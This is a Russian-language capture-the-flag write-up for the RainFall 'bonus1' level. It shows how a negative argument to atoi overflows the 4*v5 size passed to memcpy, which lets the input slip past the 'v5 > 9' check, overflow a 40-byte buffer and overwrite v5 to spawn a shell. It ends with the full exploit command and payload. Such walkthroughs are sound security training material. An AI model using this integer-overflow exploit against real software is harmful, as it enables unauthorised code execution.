# Bonus 1 - переполнение int'а

### 1. Видим, что в программе используется atoi, после чего полученное число умножается на 4:
```c
v5 = atoi(argv[1]);
if ( v5 > 9 )
return 1;
memcpy(dest, argv[2], 4 * v5);
```

### 2. Нужно подобрать число v5 таким образом, чтобы обойти проверку v5 > 9 и переполнить массив dest.
Чтобы вызвать шелл, значение v5 должно быть равно 0x574F4C46. В обычных условиях мы не сможем это сделать из-за условия ```if ( v5 > 9 )```, но так как ```v5``` стоит сразу после ```dest```, переехав массив ```dest```, мы поменяем и значение ```v5```.

Чтобы переполнить dest, переполним интовую переменную, которая отвечает за количество копируемых данных в функции ```memcpy```. Подберем такое отрицательное значение, которое бы при умножении на ```4``` давало число большее, чем ```40``` (размер ```dest```).
Напишем код на си для этой задачи:
```c
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char **argv) {
        int v5 = atoi(argv[1]);
        printf("%d\n", 4 * v5);
}
```
Подбираем число:
``` dart
└─# ./a.out -2147483648
0

RainFall]
└─# ./a.out -2147483647
4

RainFall]
└─# ./a.out -2147483646
8

RainFall]
└─# ./a.out -2147483637
44

```

### 3. Формируем пейлоад и отправляем в аргументы функции
```dart
./bonus1 -2147483637 `python -c "print 'a'*40 + '\x46\x4c\x4f\x57'"`
```